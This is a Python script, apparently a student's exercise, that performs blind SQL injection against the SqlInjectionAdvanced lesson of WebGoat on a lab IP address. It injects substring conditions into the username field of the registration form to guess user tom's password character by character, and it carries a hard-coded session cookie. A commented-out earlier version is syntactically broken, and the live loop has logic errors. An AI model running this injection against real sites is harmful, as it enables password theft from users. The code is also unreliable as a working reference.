#!C:\Python36/python.exe
#script injection pour nombre de champs
#import httplib, urllib
import json
import  requests
url='http://192.168.136.129:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4'
cara='qwertyuiopasdfghjklzxcvbnm1234567890'
def guess_the_pass(i):
    for c in range(0,37):
        injection="tom' and   substring(password, 1,{})='{}".format(i,cara[c]);
        print(injection)
        data={'username_reg':injection,'email_reg':'pop@pop.com','password_reg':'123456','confirm_password':'123456'}
    #    headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
        headers = {
            'Cookie': "JSESSIONID=ctnNZeiZN-5zi6atSExz9gVwNykATX3OWs6XVuY9",
        }

        conn = requests.put(url,headers=headers,data=data)
        #rep=conn.getresponse();
        page_retour= conn.json()
        print(page_retour)
        if 'already exists' in page_retour:
            print("there is ")
            print(conn.status_code)
            print(cara[c], end= " ")
            i+=1
            guess_the_pass(i)
            #print("Le login est :" ,login)
        else:
            continue


guess_the_pass(1)
'''
print(r)
print(r.content)
file = open("response.html",'wb')
file.write(r.content)
file.close()

'''









'''
site="192.168.126.139"
port=8080
page"/WebGoat/start.mvc"+"#lesson/SqlInjectionAdvanced.lesson/4"
cara='qwertyuiopasdfghjklzxcvbnm1234567890'
for n in range(1,6):
    for c in range(0,37):
        injection="tom' and   substring(password, 1,1)='"+cara[c];
        print(injection)
        paramaters=urllib.URLencode{'username_reg':injection,'email_reg':'pop@pop.com','mdp':'password_reg':'123456','confirm_password':'123456','valider':'Valider'})}
        headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
        try:
            conn = httplib.HTTPConnection(site+":"+str(port))
            conn.request("POST",page,parameters,headers)
            rep=conn.getresponse();
            page_retour= rep.read()
            if 'Verfiez ' in page_retour:
                login =login+carac[c:c+1]
                break
                print("Le login est :" ,login)
        except as e:
            print(e)
conn.close()
'''
